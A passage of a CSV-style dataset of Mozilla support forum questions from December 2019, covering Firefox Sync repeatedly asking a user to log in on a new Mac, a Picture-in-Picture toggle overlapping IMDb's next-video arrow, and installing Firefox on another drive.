+</p>",firefox-710;sync;desktop;linux;,firefox,sync,en-US,1271624;1272510;1272669;1272865;,pclark36
+https://support.mozilla.org/en-US/questions/4546,2019-12-07 13:41:28 -0800,2019-12-09T20:01:04Z,Why does my new Mac Firefox make me log into Firefox account every time I open it?,"<p>Every time I start Firefox on my new Macbook, I have to login to my ""Firefox Account"" to get my bookmarks, passwords, and preferences. On my old Macbook Firefox is logged in whenever I open it. How do I fix this?
+</p>",firefox-710;sync;desktop;mac-os;,firefox,sync,en-US,1271870;1271871;1271984;1272083;1272102;1272249;1272252;,suhligford
+https://support.mozilla.org/en-US/questions/4545,2019-12-07 13:33:13 -0800,2019-12-07T15:29:50Z,Picture in Picture Toggle,"<p>Discovered this when playing video in IMDb site.
+</p><p>When playing video in IMDb site the small blue rectangle that slides out when you hover over it is centred on the middle of the right hand edge of the video play back window. This is exactly where the right hand play next video white arrow &gt; is situated as well. When you wish to play the next video it picks up Firefox new Picture in Picture toggle instead of the next video arrow &gt;.
+</p>",firefox-710;customize;desktop;mac-os;,firefox,customize,en-US,1271627;1271639;,galactic1
+https://support.mozilla.org/en-US/questions/4543,2019-12-07 12:01:51 -0800,2019-12-07T16:40:20Z,How do I install Firefox in a different drive/volume on Windows 10? Support pages are inaccurate.,"<p>Attempting to install Firefox on my D drive.
